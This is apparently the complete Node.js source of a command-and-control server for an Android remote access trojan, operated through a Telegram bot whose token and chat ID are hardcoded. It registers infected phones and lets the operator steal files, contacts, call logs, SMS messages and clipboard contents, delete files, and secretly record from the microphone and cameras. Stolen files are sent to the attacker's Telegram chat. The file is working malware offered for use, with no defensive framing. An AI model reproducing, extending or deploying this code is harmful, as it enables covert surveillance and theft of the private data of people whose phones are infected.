const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");
const PORT = 3000;

const token = '7144522875:AAEFGYd8mx8p3wvfpBozxW5Ea5L-XEG2y2M'
const id = '1784606556'
const address = 'https://rat1-1-lfu0.onrender.com/'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());



let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">Alive</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `Data from <b>${req.headers.model}</b> device`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    console.log('process');
    res.send('')
})

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• Device Connected\n\n` +
        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
        `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• Device Disconnected\n\n` +
            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
            `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
            `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
            `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
            `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('Enter path file to download')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Processing...',                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Devices"], ["Execute"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Enter path file to delete')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Processing...',                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Devices"], ["Execute"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Enter duration microphone')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Processing...',                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Devices"], ["Execute"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Enter duration camera main')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Processing...',                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Devices"], ["Execute"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Enter duration camera selfie')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Processing...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Devices"], ["Execute"]],
                        'resize_keyboard': true
                    }
                }
            )
        }

    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                'Hello!',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Devices"], ["Execute"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == 'Devices') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    'No Connecting Devices',
                )
            } else {
                let text = 'List Connected Devices :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                        `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
                        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
                        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
                        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == 'Execute') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    'No Connecting Devices',
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, 'Select devices to Execute:', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, 'Permission Denied')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`What Execute ? : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'Apps', callback_data: `apps:${uuid}`},
                        {text: 'Device Info', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: 'Get File', callback_data: `file:${uuid}`},
                        {text: 'Delete File', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'Clipboard', callback_data: `clipboard:${uuid}`},
                        {text: 'Microphone', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'Main Camera', callback_data: `camera_main:${uuid}`},
                        {text: 'Selfie Camera', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: ' Rec Main Camera', callback_data: `rec_camera_main:${uuid}`},
                        {text: 'Rec Selfie Camera', callback_data: `rec_camera_selfie:${uuid}`}
                    ],                  
                    [
                        {text: 'Calls', callback_data: `calls:${uuid}`},
                        {text: 'Contacts', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'Vibrate', callback_data: `vibrate:${uuid}`},
                        {text: 'Messages', callback_data: `messages:${uuid}`},
                      
                    ]

                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Processing...',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Devices"], ["Execute"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Processing...',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Devices"], ["Execute"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Processing...',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Devices"], ["Execute"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Processing...',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Devices"], ["Execute"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Processing...',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Devices"], ["Execute"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Processing...',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Devices"], ["Execute"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Processing...',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Devices"], ["Execute"]],
                    'resize_keyboard': true
                }
            }
        )
    }
  
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Processing...',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Devices"], ["Execute"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'rec_camera_main') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Enter duration camera main\n\n' +
            'Example: <b>20</b> Seconds',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'rec_camera_selfie') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Enter duration camera selfie\n\n' +
            'Example: <b>20</b> Seconds',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }  
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Processing...',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Devices"], ["Execute"]],
                    'resize_keyboard': true
                }
            }
        )
    }

    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Enter path file to download\n\n' +
            'Example : <b> DCIM/Camera </b>.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Enter path file to delete\n\n' +
            'Example : <b> DCIM/Camera </b>.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Enter duration microphone\n\n' +
            'Example: <b>20</b> Seconds',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }

});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
